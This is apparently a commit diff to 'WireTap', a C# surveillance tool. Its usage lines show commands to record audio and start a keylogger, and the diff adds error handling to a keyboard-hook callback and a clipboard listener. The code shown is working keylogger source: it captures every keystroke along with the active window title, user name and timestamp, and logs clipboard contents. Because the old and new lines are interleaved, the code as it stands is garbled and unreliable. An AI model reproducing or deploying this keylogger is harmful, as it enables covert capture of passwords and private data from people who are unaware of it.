Examples:
    Record all audio for 30 seconds:
        WireTap.exe record_audio 30s
\
    Start the keylogger:
        WireTap.exe capture_keystrokes
 698  WireTap/Keyboard/Keyboard.cs 
@@ -1092,386 +1092,393 @@ public enum WM : uint

        private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            Int32 msgType = wParam.ToInt32();
            Int32 vKey;
            string key = "";
            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
            try
            {
                bool shift = false;
                IntPtr hWindow = GetForegroundWindow();
                short shiftState = GetAsyncKeyState(Keys.ShiftKey);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;

                // read virtual key from buffer
                vKey = Marshal.ReadInt32(lParam);

                // Parse key
                if (vKey > 64 && vKey < 91)
                Int32 msgType = wParam.ToInt32();
                Int32 vKey;
                string key = "";
                if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
                {
                    if (shift | caps)
                    bool shift = false;
                    IntPtr hWindow = GetForegroundWindow();
                    short shiftState = GetAsyncKeyState(Keys.ShiftKey);
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        key = ((Keys)vKey).ToString();
                        shift = true;
                    }
                    else
                    {
                        key = ((Keys)vKey).ToString().ToLower();
                    }
                }
                else if (vKey >= 96 && vKey <= 111)
                {
                    switch (vKey)
                    var caps = Console.CapsLock;

                    // read virtual key from buffer
                    vKey = Marshal.ReadInt32(lParam);

                    // Parse key
                    if (vKey > 64 && vKey < 91)
                    {
                        case 96:
                            key = "0";
                            break;
                        case 97:
                            key = "1";
                            break;
                        case 98:
                            key = "2";
                            break;
                        case 99:
                            key = "3";
                            break;
                        case 100:
                            key = "4";
                            break;
                        case 101:
                            key = "5";
                            break;
                        case 102:
                            key = "6";
                            break;
                        case 103:
                            key = "7";
                            break;
                        case 104:
                            key = "8";
                            break;
                        case 105:
                            key = "9";
                            break;
                        case 106:
                            key = "*";
                            break;
                        case 107:
                            key = "+";
                            break;
                        case 108:
                            key = "|";
                            break;
                        case 109:
                            key = "-";
                            break;
                        case 110:
                            key = ".";
                            break;
                        case 111:
                            key = "/";
                            break;
                        if (shift | caps)
                        {
                            key = ((Keys)vKey).ToString();
                        }
                        else
                        {
                            key = ((Keys)vKey).ToString().ToLower();
                        }
                    }
                }
                else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                {
                    if (shift)
                    else if (vKey >= 96 && vKey <= 111)
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = ")";
                            case 96:
                                key = "0";
                                break;
                            case 49:
                                key = "!";
                            case 97:
                                key = "1";
                                break;
                            case 50:
                                key = "@";
                            case 98:
                                key = "2";
                                break;
                            case 51:
                                key = "#";
                            case 99:
                                key = "3";
                                break;
                            case 52:
                                key = "$";
                            case 100:
                                key = "4";
                                break;
                            case 53:
                                key = "%";
                            case 101:
                                key = "5";
                                break;
                            case 54:
                                key = "^";
                            case 102:
                                key = "6";
                                break;
                            case 55:
                                key = "&";
                            case 103:
                                key = "7";
                                break;
                            case 56:
                                key = "*";
                            case 104:
                                key = "8";
                                break;
                            case 57:
                                key = "(";
                            case 105:
                                key = "9";
                                break;
                            case 186:
                                key = ":";
                            case 106:
                                key = "*";
                                break;
                            case 187:
                            case 107:
                                key = "+";
                                break;
                            case 188:
                                key = "<";
                                break;
                            case 189:
                                key = "_";
                                break;
                            case 190:
                                key = ">";
                                break;
                            case 191:
                                key = "?";
                                break;
                            case 192:
                                key = "~";
                                break;
                            case 219:
                                key = "{";
                                break;
                            case 220:
                            case 108:
                                key = "|";
                                break;
                            case 221:
                                key = "}";
                            case 109:
                                key = "-";
                                break;
                            case 110:
                                key = ".";
                                break;
                            case 222:
                                key = "<Double Quotes>";
                            case 111:
                                key = "/";
                                break;
                        }
                    }
                    else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                    {
                        if (shift)
                        {
                            switch (vKey)
                            {
                                case 48:
                                    key = ")";
                                    break;
                                case 49:
                                    key = "!";
                                    break;
                                case 50:
                                    key = "@";
                                    break;
                                case 51:
                                    key = "#";
                                    break;
                                case 52:
                                    key = "$";
                                    break;
                                case 53:
                                    key = "%";
                                    break;
                                case 54:
                                    key = "^";
                                    break;
                                case 55:
                                    key = "&";
                                    break;
                                case 56:
                                    key = "*";
                                    break;
                                case 57:
                                    key = "(";
                                    break;
                                case 186:
                                    key = ":";
                                    break;
                                case 187:
                                    key = "+";
                                    break;
                                case 188:
                                    key = "<";
                                    break;
                                case 189:
                                    key = "_";
                                    break;
                                case 190:
                                    key = ">";
                                    break;
                                case 191:
                                    key = "?";
                                    break;
                                case 192:
                                    key = "~";
                                    break;
                                case 219:
                                    key = "{";
                                    break;
                                case 220:
                                    key = "|";
                                    break;
                                case 221:
                                    key = "}";
                                    break;
                                case 222:
                                    key = "<Double Quotes>";
                                    break;
                            }
                        }
                        else
                        {
                            switch (vKey)
                            {
                                case 48:
                                    key = "0";
                                    break;
                                case 49:
                                    key = "1";
                                    break;
                                case 50:
                                    key = "2";
                                    break;
                                case 51:
                                    key = "3";
                                    break;
                                case 52:
                                    key = "4";
                                    break;
                                case 53:
                                    key = "5";
                                    break;
                                case 54:
                                    key = "6";
                                    break;
                                case 55:
                                    key = "7";
                                    break;
                                case 56:
                                    key = "8";
                                    break;
                                case 57:
                                    key = "9";
                                    break;
                                case 186:
                                    key = ";";
                                    break;
                                case 187:
                                    key = "=";
                                    break;
                                case 188:
                                    key = ",";
                                    break;
                                case 189:
                                    key = "-";
                                    break;
                                case 190:
                                    key = ".";
                                    break;
                                case 191:
                                    key = "/";
                                    break;
                                case 192:
                                    key = "`";
                                    break;
                                case 219:
                                    key = "[";
                                    break;
                                case 220:
                                    key = "\\";
                                    break;
                                case 221:
                                    key = "]";
                                    break;
                                case 222:
                                    key = "<Single Quote>";
                                    break;
                            }
                        }
                    }
                    else
                    {
                        switch (vKey)
                        switch ((Keys)vKey)
                        {
                            case 48:
                                key = "0";
                            case Keys.F1:
                                key = "<F1>";
                                break;
                            case 49:
                                key = "1";
                            case Keys.F2:
                                key = "<F2>";
                                break;
                            case 50:
                                key = "2";
                            case Keys.F3:
                                key = "<F3>";
                                break;
                            case 51:
                                key = "3";
                            case Keys.F4:
                                key = "<F4>";
                                break;
                            case 52:
                                key = "4";
                            case Keys.F5:
                                key = "<F5>";
                                break;
                            case 53:
                                key = "5";
                            case Keys.F6:
                                key = "<F6>";
                                break;
                            case 54:
                                key = "6";
                            case Keys.F7:
                                key = "<F7>";
                                break;
                            case 55:
                                key = "7";
                            case Keys.F8:
                                key = "<F8>";
                                break;
                            case 56:
                                key = "8";
                            case Keys.F9:
                                key = "<F9>";
                                break;
                            case 57:
                                key = "9";
                            case Keys.F10:
                                key = "<F10>";
                                break;
                            case 186:
                                key = ";";
                            case Keys.F11:
                                key = "<F11>";
                                break;
                            case 187:
                                key = "=";
                            case Keys.F12:
                                key = "<F12>";
                                break;
                            case 188:
                                key = ",";

                            //case Keys.Snapshot:
                            //    key = "<Print Screen>";
                            //    break;
                            //case Keys.Scroll:
                            //    key = "<Scroll Lock>";
                            //    break;
                            //case Keys.Pause:
                            //    key = "<Pause/Break>";
                            //    break;
                            case Keys.Insert:
                                key = "<Insert>";
                                break;
                            case 189:
                                key = "-";
                            //case Keys.Home:
                            //    key = "<Home>";
                            //    break;
                            case Keys.Delete:
                                key = "<Delete>";
                                break;
                            case 190:
                                key = ".";
                            //case Keys.End:
                            //    key = "<End>";
                            //    break;
                            //case Keys.Prior:
                            //    key = "<Page Up>";
                            //    break;
                            //case Keys.Next:
                            //    key = "<Page Down>";
                            //    break;
                            //case Keys.Escape:
                            //    key = "<Esc>";
                            //    break;
                            //case Keys.NumLock:
                            //    key = "<Num Lock>";
                            //    break;
                            //case Keys.Capital:
                            //    key = "<Caps Lock>";
                            //    break;
                            case Keys.Tab:
                                key = "<Tab>";
                                break;
                            case 191:
                                key = "/";
                            case Keys.Back:
                                key = "<Backspace>";
                                break;
                            case Keys.Enter:
                                key = "<Enter>";
                                break;
                            case Keys.Space:
                                key = "<Space Bar>";
                                break;
                            case Keys.Left:
                                key = "<Left>";
                                break;
                            case 192:
                                key = "`";
                            case Keys.Up:
                                key = "<Up>";
                                break;
                            case 219:
                                key = "[";
                            case Keys.Right:
                                key = "<Right>";
                                break;
                            case 220:
                                key = "\\";
                            case Keys.Down:
                                key = "<Down>";
                                break;
                            case 221:
                                key = "]";
                            case Keys.LMenu:
                                key = "<Alt>";
                                break;
                            case 222:
                                key = "<Single Quote>";
                            case Keys.RMenu:
                                key = "<Alt>";
                                break;
                            case Keys.LWin:
                                key = "<Windows Key>";
                                break;
                            case Keys.RWin:
                                key = "<Windows Key>";
                                break;
                            //case Keys.LShiftKey:
                            //    key = "<Shift>";
                            //    break;
                            //case Keys.RShiftKey:
                            //    key = "<Shift>";
                            //    break;
                            case Keys.LControlKey:
                                key = "<Ctrl>";
                                break;
                            case Keys.RControlKey:
                                key = "<Ctrl>";
                                break;
                        }
                    }
                }
                else
                {
                    switch ((Keys)vKey)
                    {
                        case Keys.F1:
                            key = "<F1>";
                            break;
                        case Keys.F2:
                            key = "<F2>";
                            break;
                        case Keys.F3:
                            key = "<F3>";
                            break;
                        case Keys.F4:
                            key = "<F4>";
                            break;
                        case Keys.F5:
                            key = "<F5>";
                            break;
                        case Keys.F6:
                            key = "<F6>";
                            break;
                        case Keys.F7:
                            key = "<F7>";
                            break;
                        case Keys.F8:
                            key = "<F8>";
                            break;
                        case Keys.F9:
                            key = "<F9>";
                            break;
                        case Keys.F10:
                            key = "<F10>";
                            break;
                        case Keys.F11:
                            key = "<F11>";
                            break;
                        case Keys.F12:
                            key = "<F12>";
                            break;

                        //case Keys.Snapshot:
                        //    key = "<Print Screen>";
                        //    break;
                        //case Keys.Scroll:
                        //    key = "<Scroll Lock>";
                        //    break;
                        //case Keys.Pause:
                        //    key = "<Pause/Break>";
                        //    break;
                        case Keys.Insert:
                            key = "<Insert>";
                            break;
                        //case Keys.Home:
                        //    key = "<Home>";
                        //    break;
                        case Keys.Delete:
                            key = "<Delete>";
                            break;
                        //case Keys.End:
                        //    key = "<End>";
                        //    break;
                        //case Keys.Prior:
                        //    key = "<Page Up>";
                        //    break;
                        //case Keys.Next:
                        //    key = "<Page Down>";
                        //    break;
                        //case Keys.Escape:
                        //    key = "<Esc>";
                        //    break;
                        //case Keys.NumLock:
                        //    key = "<Num Lock>";
                        //    break;
                        //case Keys.Capital:
                        //    key = "<Caps Lock>";
                        //    break;
                        case Keys.Tab:
                            key = "<Tab>";
                            break;
                        case Keys.Back:
                            key = "<Backspace>";
                            break;
                        case Keys.Enter:
                            key = "<Enter>";
                            break;
                        case Keys.Space:
                            key = "<Space Bar>";
                            break;
                        case Keys.Left:
                            key = "<Left>";
                            break;
                        case Keys.Up:
                            key = "<Up>";
                            break;
                        case Keys.Right:
                            key = "<Right>";
                            break;
                        case Keys.Down:
                            key = "<Down>";
                            break;
                        case Keys.LMenu:
                            key = "<Alt>";
                            break;
                        case Keys.RMenu:
                            key = "<Alt>";
                            break;
                        case Keys.LWin:
                            key = "<Windows Key>";
                            break;
                        case Keys.RWin:
                            key = "<Windows Key>";
                            break;
                        //case Keys.LShiftKey:
                        //    key = "<Shift>";
                        //    break;
                        //case Keys.RShiftKey:
                        //    key = "<Shift>";
                        //    break;
                        case Keys.LControlKey:
                            key = "<Ctrl>";
                            break;
                        case Keys.RControlKey:
                            key = "<Ctrl>";
                            break;
                    }
                }
                    StringBuilder title = new StringBuilder(256);
                    GetWindowText(hWindow, title, title.Capacity);

                StringBuilder title = new StringBuilder(256);
                GetWindowText(hWindow, title, title.Capacity);

                Dictionary<string, string> props = new Dictionary<string, string>();
                props["Key"] = key;
                props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                props["Window"] = title.ToString();
                if (props["Window"] != Keyboard.lastTitle)
                {
                    string titleString = "User    : " + Keyboard.userName + Environment.NewLine +
                                            "Window  : " + props["Window"] + Environment.NewLine +
                                            "Time    : " + props["Time"] + Environment.NewLine +
                                            "LogFile : " + Keyboard.logName + Environment.NewLine +
                                            "----------------------------------------------";
                    //Console.WriteLine();
                    //Console.WriteLine();
                    //Console.WriteLine(titleString);
                    //Console.WriteLine();
                    Trace.WriteLine("");
                    Trace.WriteLine("");
                    Trace.WriteLine(titleString);
                    Trace.WriteLine("");
                    // Write to file
                    Keyboard.lastTitle = props["Window"];
                    Dictionary<string, string> props = new Dictionary<string, string>();
                    props["Key"] = key;
                    props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                    props["Window"] = title.ToString();
                    if (props["Window"] != Keyboard.lastTitle)
                    {
                        string titleString = "User    : " + Keyboard.userName + Environment.NewLine +
                                                "Window  : " + props["Window"] + Environment.NewLine +
                                                "Time    : " + props["Time"] + Environment.NewLine +
                                                "LogFile : " + Keyboard.logName + Environment.NewLine +
                                                "----------------------------------------------";
                        //Console.WriteLine();
                        //Console.WriteLine();
                        //Console.WriteLine(titleString);
                        //Console.WriteLine();
                        Trace.WriteLine("");
                        Trace.WriteLine("");
                        Trace.WriteLine(titleString);
                        Trace.WriteLine("");
                        // Write to file
                        Keyboard.lastTitle = props["Window"];
                    }
                    //Console.Write(props["Key"]);
                    Trace.Write(props["Key"]);
                    // log to file here
                }
                //Console.Write(props["Key"]);
                Trace.Write(props["Key"]);
                // log to file here
            } catch(Exception ex)
            {
                Console.WriteLine("[X] Error in CallbackFunction: {0}", ex.Message);
                Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
            }
            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
@@ -1546,21 +1553,38 @@ public NotificationForm()

                protected override void WndProc(ref Message m)
                {
                    //Listen for operating system messages
                    if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                    try
                    {
                        //Listen for operating system messages
                        if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                        {

                        //Write to stdout active window
                        IntPtr active_window = NativeMethods.GetForegroundWindow();
                        int length = NativeMethods.GetWindowTextLength(active_window);
                        StringBuilder sb = new StringBuilder(length + 1);
                        NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
                        Trace.WriteLine("");
                        //Write to stdout clipboard contents
                        Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
                            //Write to stdout active window
                            IntPtr active_window = NativeMethods.GetForegroundWindow();
                            if (active_window != IntPtr.Zero && active_window != null)
                            {
                                int length = NativeMethods.GetWindowTextLength(active_window);
                                StringBuilder sb = new StringBuilder(length + 1);
                                NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
                                Trace.WriteLine("");
                                //Write to stdout clipboard contents
                                try
                                {
                                    Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
                                }
                                catch (Exception ex)
                                {
                                    Trace.WriteLine("\t[Error] Couldn't get text from clipboard.");
                                }
                            }
                        }
                        //Called for any unhandled messages
                        base.WndProc(ref m);
                    } catch (Exception ex)
                    {
                        Console.WriteLine("[X] Error in WndProc: {0}", ex.Message);
                        Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
                    }
                    //Called for any unhandled messages
                    base.WndProc(ref m);
                }
            }

@@ -1601,7 +1625,9 @@ public static void StartKeylogger()
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
                Console.WriteLine("[X] Exception: {0}", ex.Message);
                Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
                Console.WriteLine("\n[*] Log name for last session: {0}", Keyboard.logName);
            }
        }

